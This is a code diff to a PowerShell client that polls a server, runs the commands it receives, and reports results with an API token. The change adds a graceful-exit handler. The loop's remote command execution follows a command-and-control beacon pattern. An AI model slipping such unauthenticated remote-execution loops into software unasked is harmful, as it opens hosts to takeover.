@@ -129,6 +129,30 @@ while ($elapsed -lt $timeout -and -not $commandExecuted) {{
 
         if ($response.command) {{
             $commandId = $response.command_id
+
+            # Check for graceful termination signal
+            if ($response.command -eq "@PT1:GRACEFUL_EXIT@") {{
+                Write-Host "[$stableId] Received graceful exit signal" -ForegroundColor Cyan
+                Write-Host "[$stableId] Shutting down gracefully..." -ForegroundColor Cyan
+
+                # Submit acknowledgment to server
+                try {{
+                    $resultData = @{{
+                        command_id = $commandId
+                        result = "Client terminated gracefully"
+                        status = "completed"
+                        result_type = "text"
+                    }} | ConvertTo-Json -Compress
+
+                    Invoke-RestMethod -Uri "$serverUrl/submit_result" -Method POST -Body $resultData -ContentType "application/json" -Headers @{{"X-API-Token"=$apiToken}} -UseBasicParsing | Out-Null
+                }} catch {{
+                    # Ignore error if submission fails
+                }}
+
+                Write-Host "[$stableId] Goodbye!" -ForegroundColor Green
+                exit 0
+            }}
+
             Write-Host "[$stableId] Executing: $($response.command)" -ForegroundColor Yellow
 
             # Get files before execution for comparison
